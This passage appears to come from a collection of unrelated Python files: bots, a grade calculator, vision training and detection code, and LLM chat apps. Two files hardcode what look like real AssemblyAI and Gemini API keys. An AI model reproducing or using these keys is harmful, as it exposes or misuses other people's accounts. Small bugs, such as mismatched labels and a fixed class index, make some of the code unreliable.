%H:%M:%S\"\n)\n\nfile_handler = logging.handlers.RotatingFileHandler(\n    filename='tdl_bot.log',maxBytes=1 * 1024 * 1024, backupCount=3,\n    encoding='utf-8')\nfile_handler.setFormatter(formatter)\nfile_handler.setLevel(logging.DEBUG)\n\nlogger = logging.getLogger(__name__)\nlogger.addHandler(file_handler)\n\n\ndef get_config():\n    if not os.path.isfile(CFG_PATH):\n        logger.info(\"Config file not found, generating default config.\")\n        generate_config()\n        sys.exit()\n    with open(CFG_PATH, 'r', encoding='utf-8') as f:\n        config = tomlkit.loads(f.read())\n    g_config[\"debug\"] = config[\"debug\"]\n    g_config[\"bot_token\"] = config[\"bot_token\"]\n    g_config[\"download_path\"] = config[\"download_path\"]\n    g_config[\"proxy_url\"] = config.get(\"proxy_url\", None)\n    g_config[\"tags\"] = config[\"tags\"]\n    logger.debug(\n        f\"config: \\n\\\n          * debug: {g_config['debug']}\\n\\\n          * download_path: {g_config['download_path']}\\n\\\n          * proxy_url: {g_config['proxy_url']}\\n\\\n          * tags: {g_config['tags']}\")\n\ndef generate_config():\n    doc = tomlkit.document()\n    doc.add(tomlkit.comment(\"*** TDL telegram bot ***\"))\n    doc.add(tomlkit.comment(\"TDL: https://github.com/iyear/tdl\"))\n    doc.add(tomlkit.nl())\n    doc.add(\"debug\", g_config[\"debug\"])\n    doc.add(\"bot_token\", g_config[\"bot_token\"])\n    doc.add(\"download_path\", g_config[\"download_path\"])\n    doc.add(tomlkit.nl())\n    doc.add(tomlkit.comment(\"This proxy will be used for both telegram bot and tdl\"))\n    doc.add(tomlkit.comment(\"If you don't need proxy, please remove the proxy_url keyword\"))\n    doc.add(\"proxy_url\", g_config[\"proxy_url\"])\n    doc.add(tomlkit.nl())\n    doc.add(tomlkit.comment(\n        \"To use socks proxy, need to install extra python package:\"))\n    doc.add(tomlkit.comment(\"pip install python-telegram-bot[socks]\"))\n    doc.add(tomlkit.comment(\"and set socks proxy:\"))\n    doc.add(tomlkit.comment(\"proxy_url = \\\"socks5://user:pass@host:port\\\"\"))\n    doc.add(tomlkit.nl())\n    doc.add(\"tags\", g_config[\"tags\"])\n    with open(CFG_PATH, 'w', encoding='utf-8') as f:\n        tomlkit.dump(doc, f)\n    logger.info(f\"The default configuration {CFG_PATH} is generated.\")\n    sys.exit()\n\n\nclass Keyborad():\n    def __init__(self, tags, msg_id) -> None:\n        self.tags = tags\n        self.msg_id = msg_id\n        self.tags_len = len(tags)\n        self.is_single_page = self.tags_len <= KEYBOARD_MAX_ONE_PAGE_LEN\n        self.keyboard = []\n        self.get_keyboard()\n\n    def multiple_navigator(self):\n        return [InlineKeyboardButton(\"prev\", callback_data=f\"prev#{str(self.msg_id)}\"),\n                InlineKeyboardButton(\"cancel\", callback_data=f\"cancel#{str(self.msg_id)}\"),\n                InlineKeyboardButton(\"next\", callback_data=f\"next#{str(self.msg_id)}\")]\n    def single_navigator(self):\n        return [InlineKeyboardButton(\"cancel\", callback_data=f\"cancel#{str(self.msg_id)}\")]\n\n    def button(self, text, callback_data):\n        return InlineKeyboardButton(text=text, callback_data=f\"{callback_data}#{self.msg_id}\")\n\n    def get_keyboard(self):\n        row = []\n        page = []\n        if self.is_single_page:\n            for i in range(self.tags_len):\n                row.append(self.button(self.tags[i], self.tags[i]))\n                if len(row) == KEYBOARD_MAX_ROW_LEN:\n                    page.append(row)\n                    logger.debug(f\"row: {row}, page: {page}\")\n                    row = []\n                if i == self.tags_len - 1:\n                    page.append(row)\n                    logger.debug(f\"page: {page}\")\n                    page.append(self.single_navigator())\n                    self.keyboard.append(page)\n        else:\n            for i in range(self.tags_len):\n                row.append(self.b",
    "import streamlit as st\nimport random\nimport time\nfrom openai import OpenAI\nimport os\nfrom dotenv import load_dotenv\n\n# Load environment variables\nload_dotenv()\nAZURE_KEY = os.environ['OPENAI_KEY']\n\n# Streamed response emulator\ndef response_generator():\n    response = random.choice(\n        [\n            \"Hello there! How can I assist you today?\",\n            \"Hi, human! Is there anything I can help you with?\",\n            \"Do you need help?\",\n        ]\n    )\n    for word in response.split():\n        yield word + \" \"\n        time.sleep(0.05)\n\n\n# Set OpenAI API key from Streamlit secrets\nclient = OpenAI(api_key=AZURE_KEY)\n\n# Set a default model\nif \"openai_model\" not in st.session_state:\n    st.session_state[\"openai_model\"] = \"gpt-3.5-turbo\"\n\nst.title(\"Echo Bot\")\n\n# Initialize chat history\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\n# Display chat messages from history on app rerun\nfor message in st.session_state.messages:\n    print('Rendering all history...')\n    with st.chat_message(message[\"role\"]):\n        st.markdown(message[\"content\"]) # st.write() also works fine!\n\n# React to user input\nif prompt := st.chat_input(\"What is up?\"):\n    # Display user message in chat message container\n    st.chat_message(\"user\").markdown(prompt)\n    # Add user message to chat history\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\n\n\n    # Bot's response\n    response = f\"Echo: {prompt}\"\n    # Display assistant response in chat message container\n    with st.chat_message(\"assistant\"):\n        # immediate render\n        #st.markdown(response) \n\n        # streaming render dummy\n        #stream = response_generator()\n\n        stream = client.chat.completions.create(\n            model=st.session_state[\"openai_model\"],\n            messages=[\n                {\"role\": m[\"role\"], \"content\": m[\"content\"]}\n                for m in st.session_state.messages\n            ],\n            stream=True,\n        )\n\n        response = st.write_stream(stream)\n\n\n    # Add assistant response to chat history\n    st.session_state.messages.append({\"role\": \"assistant\", \"content\": response})",
    "def estudiantesPorNivel(estudiantes: dict, nivel: str) -> list:\n    estudiantes_nivel = []\n    for ID, datos in estudiantes.items():\n        if datos[2] == nivel:\n            estudiantes_nivel.append((ID, datos[0], datos[1]))\n    return estudiantes_nivel\n\ndef progresoEstudiante(inscripciones: list, cursos: dict, ID: str) -> dict:\n    progreso = {}\n\n    for inscripcion in inscripciones:\n        if inscripcion[0] == ID and inscripcion[5] == 'Aprobado':\n            curso_codigo = inscripcion[1]\n            curso_nivel = cursos[curso_codigo][2]\n            curso_creditos = cursos[curso_codigo][1]\n\n            progreso[curso_nivel] = progreso.get(curso_nivel, 0) + curso_creditos\n\n    return progreso\n\ndef analizarCurso(codigo_curso: str, inscripciones: list) -> dict:\n    notas = []\n    aprobados = 0\n    reprobados = 0\n\n    for inscripcion in inscripciones:\n        if inscripcion[1] == codigo_curso:\n            notas.append(inscripcion[4])\n            if inscripcion[5] == 'Aprobado':\n                aprobados += 1\n            else:\n                reprobados += 1\n\n    promedio = sum(notas) / len(notas)\n\n    distribucion_notas = {}\n    for nota in set(notas):\n        distribucion_notas[nota] = notas.count(nota)\n\n    porcentaje_aprobados = round((aprobados / len(notas)) * 100, 2)\n    porcentaje_reprobados = round((reprobados / len(notas)) * 100, 2)\n\n    return {\n        \"Promedio\": promedio,\n        \"Distribuci\u00f3n de Notas\": distribucion_notas,\n        \"Porcentaje de Aprobados\": porcentaje_aprobados,\n        \"Porcentaje de Reprobados\": porcentaje_reprobados,\n        \"Total de Estudiantes\": len(notas)\n    }\n\ndef main():\n    # Datos de ejemplo\n    estudiantes = {\n        '12345': ('Mar\u00eda', 'maria@example.com', 'Avanzado'),\n        '67890': ('Juan', 'juan@example.com', 'Intermedio'),\n        '54321': ('Pedro', 'pedro@example.com', 'Intermedio'),\n        '98765': ('Ana', 'ana@example.com', 'Avanzado')\n    }\n\n    cursos = {\n        'BIO101': ('Biolog\u00eda Celular', 5, 'Introductorio', []),\n        'BIO201': ('Gen\u00e9tica', 6, 'Avanzado', ['BIO101']),\n        'MAT101': ('\u00c1lgebra Lineal', 4, 'Introductorio', []),\n        'MAT201': ('C\u00e1lculo Diferencial', 5, 'Intermedio', ['MAT101']),\n        'MAT301': ('C\u00e1lculo Integral', 5, 'Intermedio', ['MAT201']),\n        'BIO301': ('Biolog\u00eda Molecular', 6, 'Avanzado', ['BIO201'])\n    }\n\n    inscripciones = [\n        ('12345', 'BIO101', 2023, 1, 3.5, 'Aprobado'),\n        ('12345', 'BIO201', 2023, 2, 4.0, 'Aprobado'),\n        ('67890', 'BIO101', 2023, 1, 2.8, 'Aprobado'),\n        ('54321', 'MAT101', 2023, 1, 3.0, 'Aprobado'),\n        ('98765', 'BIO101', 2023, 1, 2.5, 'Reprobado'),\n        ('98765', 'BIO201', 2023, 2, 3.8, 'Aprobado'),\n        ('98765', 'MAT101', 2023, 1, 4.0, 'Aprobado'),\n        ('12345', 'MAT101', 2023, 1, 3.7, 'Aprobado'),\n        ('12345', 'MAT201', 2023, 2, 4.2, 'Aprobado'),\n        ('67890', 'BIO201', 2023, 2, 3.1, 'Aprobado'),\n        ('67890', 'MAT101', 2023, 1, 2.9, 'Reprobado'),\n        ('54321', 'BIO101', 2023, 1, 3.8, 'Aprobado'),\n        ('98765', 'MAT201', 2023, 2, 3.2, 'Reprobado'),\n        ('98765', 'BIO301', 2023, 2, 4.1, 'Aprobado'),\n    ]\n\n    # Ejemplo de uso\n    print(\"Estudiantes en el nivel Avanzado:\", estudiantesPorNivel(estudiantes, 'Intermedio'))\n    print(\"Progreso del estudiante con ID '12345':\", progresoEstudiante(inscripciones, cursos, '12345'))\n    print(\"An\u00e1lisis del curso 'MAT201':\", analizarCurso('MAT201', inscripciones))\n\nif __name__ == \"__main__\":\n    main()\n",
    "import math\nfrom typing import Iterable, Optional\nimport torch\nfrom timm.data import Mixup\nfrom timm.utils import accuracy, ModelEma\nimport numpy as np\nimport utils\nimport torch.nn.functional as F\n\n\ndef train_one_epoch(model: torch.nn.Module, criterion: torch.nn.Module,\n                    data_loader: Iterable, optimizer: torch.optim.Optimizer,\n                    device: torch.device, epoch: int, loss_scaler, max_norm: float = 0,\n                    model_ema: Optional[ModelEma] = None, mixup_fn: Optional[Mixup] = None, log_writer=None,\n                    wandb_logger=None, start_steps=None, lr_schedule_values=None, wd_schedule_values=None,\n                    num_training_steps_per_epoch=None, update_freq=None, use_amp=False):\n    model.train(True)\n    metric_logger = utils.MetricLogger(delimiter=\"  \")\n    metric_logger.add_meter('lr', utils.SmoothedValue(window_size=1, fmt='{value:.6f}'))\n    metric_logger.add_meter('min_lr', utils.SmoothedValue(window_size=1, fmt='{value:.6f}'))\n    header = 'Epoch: [{}]'.format(epoch)\n    print_freq = 10\n\n    optimizer.zero_grad()\n\n    for data_iter_step, (samples, targets) in enumerate(metric_logger.log_every(data_loader, print_freq, header)):\n        step = data_iter_step // update_freq\n        if step >= num_training_steps_per_epoch:\n            continue\n        it = start_steps + step  # Global training iteration\n        # Update LR & WD for the first acc\n        if lr_schedule_values is not None or wd_schedule_values is not None and data_iter_step % update_freq == 0:\n            for i, param_group in enumerate(optimizer.param_groups):\n                if lr_schedule_values is not None:\n                    param_group[\"lr\"] = lr_schedule_values[it] * param_group[\"lr_scale\"]\n                if wd_schedule_values is not None and param_group[\"weight_decay\"] > 0:\n                    param_group[\"weight_decay\"] = wd_schedule_values[it]\n\n        samples = samples.to(device, non_blocking=True)\n        targets = targets.to(device, non_blocking=True)\n\n\n        if mixup_fn is not None:\n            samples, targets = mixup_fn(samples, targets)\n\n        if use_amp:\n            with torch.cuda.amp.autocast():\n                output = model(samples)\n                loss = criterion(output, targets)\n                \n\n        else:  # Full precision\n            output = model(samples)\n            loss = criterion(output, targets)\n\n        loss_value = loss.item()\n\n        if not math.isfinite(loss_value):  # This could trigger if using AMP\n            print(\"Loss is {}, stopping training\".format(loss_value))\n            assert math.isfinite(loss_value)\n\n        if use_amp:\n            # This attribute is added by timm on one optimizer (adahessian)\n            is_second_order = hasattr(optimizer, 'is_second_order') and optimizer.is_second_order\n            loss /= update_freq\n            grad_norm = loss_scaler(loss, optimizer, clip_grad=max_norm,\n                                    parameters=model.parameters(), create_graph=is_second_order,\n                                    update_grad=(data_iter_step + 1) % update_freq == 0)\n            if (data_iter_step + 1) % update_freq == 0:\n                optimizer.zero_grad()\n                if model_ema is not None:\n                    model_ema.update(model)\n        else:  # Full precision\n            loss /= update_freq\n            loss.backward()\n            if (data_iter_step + 1) % update_freq == 0:\n                optimizer.step()\n                optimizer.zero_grad()\n                if model_ema is not None:\n                    model_ema.update(model)\n\n        torch.cuda.synchronize()\n\n        if mixup_fn is None:\n            class_acc = (output.max(-1)[-1] == targets).float().mean()\n        else:\n            class_acc = None\n        metric_logger.update(loss=loss_value)\n        metric_logger.update(class_acc=class_acc)\n        min_lr = 10.\n        max_lr = 0.\n        for group in optimizer.param_groups:\n            min_lr = min(min_lr, group[\"lr\"])\n            max_lr = max(max_lr, group[\"lr\"])\n\n        metric_logger.update(lr=max_lr)\n        metric_logger.update(min_lr=min_lr)\n        weight_decay_value = None\n        for group in optimizer.param_groups:\n            if group[\"weight_decay\"] > 0:\n                weight_decay_value = group[\"weight_decay\"]\n        metric_logger.update(weight_decay=weight_decay_value)\n        if use_amp:\n            metric_logger.update(grad_norm=grad_norm)\n\n        if log_writer is not None:\n            log_writer.update(loss=loss_value, head=\"loss\")\n            log_writer.update(class_acc=class_acc, head=\"loss\")\n            log_writer.update(lr=max_lr, head=\"opt\")\n            log_writer.update(min_lr=min_lr, head=\"opt\")\n            log_writer.update(weight_decay=weight_decay_value, head=\"opt\")\n            if use_amp:\n                log_writer.update(grad_norm=grad_norm, head=\"opt\")\n            log_writer.set_step()\n\n        if wandb_logger:\n            wandb_logger._wandb.log({\n               ",
    "import timm  # noqa\r\nimport torchvision.models as models  # noqa\r\n\r\n_BACKBONES = {\r\n    \"alexnet\": \"models.alexnet(pretrained=True)\",\r\n    \"bninception\": 'pretrainedmodels.__dict__[\"bninception\"]'\r\n    '(pretrained=\"imagenet\", num_classes=1000)',\r\n    \"resnet50\": \"models.resnet50(pretrained=True)\",\r\n    \"resnet101\": \"models.resnet101(pretrained=True)\",\r\n    \"resnext101\": \"models.resnext101_32x8d(pretrained=True)\",\r\n    \"resnet200\": 'timm.create_model(\"resnet200\", pretrained=True)',\r\n    \"resnest50\": 'timm.create_model(\"resnest50d_4s2x40d\", pretrained=True)',\r\n    \"resnetv2_50_bit\": 'timm.create_model(\"resnetv2_50x3_bitm\", pretrained=True)',\r\n    \"resnetv2_50_21k\": 'timm.create_model(\"resnetv2_50x3_bitm_in21k\", pretrained=True)',\r\n    \"resnetv2_101_bit\": 'timm.create_model(\"resnetv2_101x3_bitm\", pretrained=True)',\r\n    \"resnetv2_101_21k\": 'timm.create_model(\"resnetv2_101x3_bitm_in21k\", pretrained=True)',\r\n    \"resnetv2_152_bit\": 'timm.create_model(\"resnetv2_152x4_bitm\", pretrained=True)',\r\n    \"resnetv2_152_21k\": 'timm.create_model(\"resnetv2_152x4_bitm_in21k\", pretrained=True)',\r\n    \"resnetv2_152_384\": 'timm.create_model(\"resnetv2_152x2_bit_teacher_384\", pretrained=True)',\r\n    \"resnetv2_101\": 'timm.create_model(\"resnetv2_101\", pretrained=True)',\r\n    \"vgg11\": \"models.vgg11(pretrained=True)\",\r\n    \"vgg19\": \"models.vgg19(pretrained=True)\",\r\n    \"vgg19_bn\": \"models.vgg19_bn(pretrained=True)\",\r\n    \"wideresnet50\": \"models.wide_resnet50_2(pretrained=True)\",\r\n    \"wideresnet101\": \"models.wide_resnet101_2(pretrained=True)\",\r\n    \"mnasnet_100\": 'timm.create_model(\"mnasnet_100\", pretrained=True)',\r\n    \"mnasnet_a1\": 'timm.create_model(\"mnasnet_a1\", pretrained=True)',\r\n    \"mnasnet_b1\": 'timm.create_model(\"mnasnet_b1\", pretrained=True)',\r\n    \"densenet121\": 'timm.create_model(\"densenet121\", pretrained=True)',\r\n    \"densenet201\": 'timm.create_model(\"densenet201\", pretrained=True)',\r\n    \"inception_v4\": 'timm.create_model(\"inception_v4\", pretrained=True)',\r\n    \"vit_small\": 'timm.create_model(\"vit_small_patch16_224\", pretrained=True)',\r\n    \"vit_base\": 'timm.create_model(\"vit_base_patch16_224\", pretrained=True)',\r\n    \"vit_large\": 'timm.create_model(\"vit_large_patch16_224\", pretrained=True)',\r\n    \"vit_r50\": 'timm.create_model(\"vit_large_r50_s32_224\", pretrained=True)',\r\n    \"vit_deit_base\": 'timm.create_model(\"deit_base_patch16_224\", pretrained=True)',\r\n    \"vit_deit_distilled\": 'timm.create_model(\"deit_base_distilled_patch16_224\", pretrained=True)',\r\n    \"vit_swin_base\": 'timm.create_model(\"swin_base_patch4_window7_224\", pretrained=True)',\r\n    \"vit_swin_large\": 'timm.create_model(\"swin_large_patch4_window7_224\", pretrained=True)',\r\n    \"efficientnet_b7\": 'timm.create_model(\"tf_efficientnet_b7\", pretrained=True)',\r\n    \"efficientnet_b5\": 'timm.create_model(\"tf_efficientnet_b5\", pretrained=True)',\r\n    \"efficientnet_b3\": 'timm.create_model(\"tf_efficientnet_b3\", pretrained=True)',\r\n    \"efficientnet_b1\": 'timm.create_model(\"tf_efficientnet_b1\", pretrained=True)',\r\n    \"efficientnetv2_m\": 'timm.create_model(\"tf_efficientnetv2_m\", pretrained=True)',\r\n    \"efficientnetv2_l\": 'timm.create_model(\"tf_efficientnetv2_l\", pretrained=True)',\r\n    \"efficientnet_b3a\": 'timm.create_model(\"efficientnet_b3a\", pretrained=True)',\r\n}\r\n\r\n\r\ndef load(name):\r\n    return eval(_BACKBONES[name])",
    "import cv2\nimport numpy as np \n\n\nvideo = '/home/ankan_opencv/officework/indore-talk24-projects/OpenCV-DNN-Object-Detection-with-SSD/street.mp4'\nimage = '/home/ankan_opencv/officework/indore-talk24-projects/OpenCV-DNN-Object-Detection-with-SSD/dog.jpg'\n\ndef load_model():\n    model= cv2.dnn.readNet(model='frozen_inference_graph.pb',\n                           config='ssd_mobilenet_v2_coco_2018_03_29.pbtxt.txt',\n                           framework='TensorFlow')\n    with open('object_detection_classes_coco.txt', 'r') as f:\n        class_names = f.read().split('\\n')\n    COLORS = np.random.uniform(0, 255, size=(len(class_names), 3))\n    return model, class_names, COLORS   \n\ndef load_img(img_path):\n    img=cv2.imread(img_path)\n    img=cv2.resize(img, None, fx=0.4, fy=0.4)\n    height, width, channels = img.shape\n    return img, height, width, channels\n\ndef detect_objects(img, net):\t\t\t\n\tblob = cv2.dnn.blobFromImage(img, size=(300, 300), mean=(104, 117, 123), swapRB=True)\n\tnet.setInput(blob)\n\toutputs = net.forward()\n\t#print (outputs)\n\treturn blob, outputs\n\ndef get_box_dimensions(outputs, height, width):\n\tboxes = []\n\tclass_ids = []\n \n\tfor detect in outputs[0,0,:,:]:\n\t\tscores = detect[2]\n\t\tclass_id = detect[1]\n\t\tif scores > 0.3:\n\t\t\tw = int(detect[5] * width)\n\t\t\th = int(detect[6] * height)\n\t\t\tx = int((detect[3] * width))\n\t\t\ty = int((detect[4] * height))\n\t\t\tboxes.append([x, y, w, h])\n\t\t\tclass_ids.append(class_id)\n\treturn boxes, class_ids\n\ndef draw_labels(boxes, colors, class_ids, classes, img): \n\tfont = cv2.FONT_HERSHEY_PLAIN\n\tmodel, classes, colors = load_model()\n\tfor i in range(len(boxes)):\n\t\tx, y, w, h = boxes[i]\n\t\tlabel = classes[int(class_ids[0])-1]\n\t\tcolor = colors[i]\n\t\tcv2.rectangle(img, (x,y), (w,h), color, 2)\n\t\tcv2.putText(img, label, (x, y - 5), font, 1, color, 1)\n\treturn img\n\ndef image_detect(img_path): \n\tmodel, classes, colors = load_model()\n\timage, height, width, channels = load_img(img_path)\n\tblob, outputs = detect_objects(image, model)\n\tboxes, class_ids = get_box_dimensions(outputs, height, width)\n\timg_out = draw_labels(boxes, colors, class_ids, classes, image)\n\tcv2.imshow('image', img_out)\n\tcv2.waitKey(0)\n\tcv2.destroyAllWindows()\n\n\t\n\t\n\ndef start_video(video_path):\n    model, classes, colors = load_model()\n    cap = cv2.VideoCapture(video_path)\n\n    if not cap.isOpened():\n        print(\"Error: Could not open video.\")\n        return\n\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            break  # Exit the loop if the video ends or cannot read the frame\n\n        height, width, channels = frame.shape\n        blob, outputs = detect_objects(frame, model)\n        boxes, class_ids = get_box_dimensions(outputs, height, width)\n        frame = draw_labels(boxes, colors, class_ids, classes, frame)\n        # frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n        cv2.imshow('output', frame)\n\n        if cv2.waitKey(1) & 0xFF == ord('q'):  # Press 'q' to exit the loop\n            break\n\n    cap.release()\n    cv2.destroyAllWindows()\n\n\n\ndef write_video(video_path):\n    model, classes, colors = load_model()\n    cap = cv2.VideoCapture(video_path)\n\n    if not cap.isOpened():\n        print(\"Error: Could not open video.\")\n        return\n\n    # Get video properties to initialize VideoWriter\n    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))\n    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))\n    fps = int(cap.get(cv2.CAP_PROP_FPS))\n    \n    # Initialize the VideoWriter object\n    out = cv2.VideoWriter('output_video.mp4', cv2.VideoWriter_fourcc(*'mp4v'), fps, (frame_width, frame_height))\n\n    while True:\n        ret, frame = cap.read()\n        if not ret:\n            break  # Exit the loop if the video ends or cannot read the frame\n\n        height, width, channels = frame.shape\n        blob, outputs = detect_objects(frame, model)\n        boxes, class_ids = get_box_dimensions(outputs, height, width)\n        frame = draw_labels(boxes, colors, class_ids, classes, frame)\n        # cv2.imshow('output', frame)\n        \n        # Write the processed frame to the output video file\n        out.write(frame)\n\n        if cv2.waitKey(1) & 0xFF == ord('q'):  # Press 'q' to exit the loop\n            break\n\n    cap.release()\n    out.release()  # Release the VideoWriter object\n    cv2.destroyAllWindows()\n\n\n# write_video(video)\n\n# start_video(video)\n\nimage_detect(image)",
    "import assemblyai as goku\r\nimport google.generativeai as genai\r\nimport pyaudio\r\nimport wave\r\nimport numpy as np\r\nimport time\r\nimport requests, json, time\r\nimport pyttsx3\r\n\r\n\r\n\r\nCHUNK = 1024\r\nFORMAT = pyaudio.paInt16\r\nCHANNELS = 1\r\nRATE = 44100\r\nSILENCE_THRESHOLD = 7000\r\nSILENCE_DURATION = 4\r\nWAVE_OUTPUT_FILENAME = \"dee.wav\"\r\n\r\np = pyaudio.PyAudio()\r\n\r\nstream = p.open(\r\n    format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK\r\n)\r\n\r\n\r\nprint(\"* sun rhi hu......\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\")\r\n\r\nframes = []\r\nstart_time = time.time()\r\nsilent_duration = 0\r\n\r\n\r\nwhile True:\r\n    data = stream.read(CHUNK)\r\n    frames.append(data)\r\n    audio_chunk = np.frombuffer(data, dtype=np.int16)\r\n    energy = np.sum(audio_chunk**2) / len(audio_chunk)\r\n\r\n    if energy < SILENCE_THRESHOLD:\r\n        silent_duration += 1\r\n    else:\r\n        silent_duration = 0\r\n\r\n    if silent_duration >= RATE / CHUNK * SILENCE_DURATION:\r\n        break\r\n\r\nprint(\"* sun liya ab thoda sabar rakh bandar......\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\")\r\n\r\nstream.stop_stream()\r\nstream.close()\r\np.terminate()\r\n\r\nwf = wave.open(WAVE_OUTPUT_FILENAME, \"wb\")\r\nwf.setnchannels(CHANNELS)\r\nwf.setsampwidth(p.get_sample_size(FORMAT))\r\nwf.setframerate(RATE)\r\nwf.writeframes(b\"\".join(frames))\r\nwf.close()\r\n\r\n\r\ngoku.settings.api_key = \"a63abf7b770f4b5d80ad652878f9d89d\"\r\n\r\naudio_url = \"dee.wav\"\r\n\r\n\r\ngemini_api_key = \"AIzaSyD-w3B-jjyesP9f8ExJ5gd-Xd8PqXcUUPc\"\r\n\r\n\r\ngenai.configure(api_key=gemini_api_key)\r\nmodel = genai.GenerativeModel(\"gemini-pro\")\r\ngokuGenerator = goku.Transcriber()\r\ngokuScript = gokuGenerator.transcribe(audio_url)\r\n\r\nresponse = model.generate_content(gokuScript.text)\r\n\r\n\r\nengine = pyttsx3.init()\r\nengine.say(response.text)\r\nengine.runAndWait()",
    "from flask import Flask, render_template, request\nimport google.generativeai as genai\n\napp = Flask(__name__)\n\n# Configure the API key for authentication\ngenai.configure(api_key=\"AIzaSyA6Bkhpmh6MY2-whmHejhRUsnA286YsExI\")\n\n# Set up the model with generation configuration and safety settings\ngeneration_config = {\n    \"temperature\": 0.9,\n    \"top_p\": 1,\n    \"top_k\": 1,\n    \"max_output_tokens\": 2048,\n}\n\nsafety_settings = [\n    {\n        \"category\": \"HARM_CATEGORY_HARASSMENT\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n    {\n        \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n    {\n        \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n    {\n        \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n]\n\n# Initialize the generative model\nmodel = genai.GenerativeModel(\n    model_name=\"gemini-1.0-pro\",\n    generation_config=generation_config,\n    safety_settings=safety_settings\n)\n\n# Function to start a conversation\ndef start_conversation():\n    return model.start_chat(history=[\n        {\n            \"role\": \"user\",\n            \"parts\": [\"car\"]\n        },\n        {\n            \"role\": \"model\",\n            \"parts\": [\"**Noun**\\n\\n1. A motor vehicle with four wheels, an engine that powers it, and seats for one to eight people.\\n2. A railway carriage for passengers.\\n3. A cable car or funicular railway.\\n4. (informal) A stolen vehicle.\\n\\n**Verb**\\n\\n1. To transport or drive (someone or something) in a car.\\n2. (slang) To steal (a car).\\n\\n**Examples**\\n\\n1. We drove to the beach in my new car.\\n2. The car was parked illegally.\\n3. The car was stolen from the driveway.\\n4. The thief was arrested for car theft.\\n\\n**Synonyms**\\n\\n* Automobile\\n* Vehicle\\n* Motor car\\n* Coach\\n* Saloon\\n* Sedan\\n* Coupe\\n* Hatchback\\n* Estate car\\n* Station wagon\\n* SUV\\n* Crossover\"]\n        }\n    ])\n\n\n# Home route\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n# Chatbot route\n@app.route('/chatbot', methods=['POST'])\ndef chatbot():\n    user_input = request.form['user_input']\n    convo = start_conversation()\n    convo.send_message(user_input)\n    bot_response = convo.last.text\n    return render_template('index.html', user_input=user_input, bot_response=bot_response)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
    "\r\n'''\r\n    logcreator module of ChemAuto program.\r\n    Creating log file to monitor user input and program output \r\n    Developed by: Li Xilong\r\n    Last Update: 2024-04-01\r\n'''\r\n\r\nimport os\r\nimport logging\r\nfrom datetime import datetime, timedelta\r\n\r\ndef setup_logging():\r\n    # The same dir with .exe\r\n    log_file = 'chemauto.log'\r\n    if not os.path.exists(log_file):\r\n        open(log_file, 'w').close()\r\n\r\n    #Config log settings\r\n    logging.basicConfig(filename=log_file, \r\n                        level=logging.INFO, \r\n                        format='%(asctime)s - %(message)s', \r\n                        datefmt='%Y-%m-%d %H:%M:%S')\r\n\r\ndef clean_logs():\r\n    log_file = 'chemauto.log'\r\n    retention_period = timedelta(days=3)\r\n    now = datetime.now()\r\n    \r\n    if os.path.exists(log_file):\r\n        # Get the creation time of log file\r\n        log_file_time = os.path.getmtime(log_file)\r\n        # datetime.now() return a date but .getmtime() return a * seconds, transfer format before clac\r\n        log_creation_time = datetime.fromtimestamp(log_file_time)\r\n        if now - log_creation_time > retention_period:\r\n            try:\r\n                os.remove(log_file)\r\n                #print(f\"Old log file {log_file} has been removed due to exceeding retention period.\\n\")\r\n            except Exception:\r\n                pass\r\n\r\ndef logged_input(prompt):\r\n    user_input = input(prompt)\r\n    #Record both prompt and user_input\r\n    logging.info(f\"Input: {prompt}{user_input}\")\r\n    return user_input\r\n\r\ndef logged_print(*args, **kwargs):\r\n    message = ' '.join(map(str, args))\r\n    logging.info(message)\r\n    print(*args, **kwargs)\r\n\r\nif __name__ == \"__main__\":\r\n    clean_logs()\r\n\r\n    setup_logging()\r\n    \r\n",
    "# Import relevant classes from correct modules \r\nimport requests\r\nfrom llama_index.llms.openai import OpenAI\r\nfrom llama_index.agent.openai import OpenAIAgent\r\nfrom llama_index.core.tools import FunctionTool\r\nfrom llama_parse import LlamaParse\r\nfrom llama_index.core import VectorStoreIndex, StorageContext, load_index_from_storage\r\nfrom llama_index.core.tools import QueryEngineTool, ToolMetadata\r\nfrom llama_index.core.objects import ObjectIndex, SimpleToolNodeMapping\r\nfrom llama_index.agent.openai_legacy import FnRetrieverOpenAIAgent\r\nimport os\r\n\r\n# Set environmental variables\r\nos.environ[\"OPENAI_API_KEY\"] = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxZ7M\"\r\nopenai_api_key = os.environ[\"OPENAI_API_KEY\"]\r\n\r\n                    #Define 5 separate functions for the 4 API calls and 1 RAG system\r\n\r\n# Define Function 1 for LcL API Call\r\n\r\ndef fetch_LcL_freight_rates(origin, destination, cargo_weight, cargo_type, weight, length, width, height, units):\r\n    url = f\"yourendpoint?origin={origin}&destination={destination}&cargoWeight={cargo_weight}&cargoType={cargo_type}&weight={weight}&length={length}&width={width}&height={height}&units={units}\"\r\n    response = requests.get(url)\r\n    print(\"Request made\")\r\n\r\n    if response.ok:\r\n        try:\r\n            data = response.json()\r\n            print(\"Response obtained\")\r\n\r\n            LcL_quote_details = []\r\n\r\n            relevant_shipments = [\r\n                quote for quote in data\r\n                ]\r\n\r\n            if relevant_shipments:\r\n                print(\"LcL quote details:\")\r\n                for shipment in relevant_shipments:\r\n                    shipment_dict = {\r\n                        \"quoteId\": shipment[\"quoteId\"],\r\n                        \"countryOfOrigin\": shipment[\"countryOfOrigin\"],\r\n                        \"portOfOrigin\": 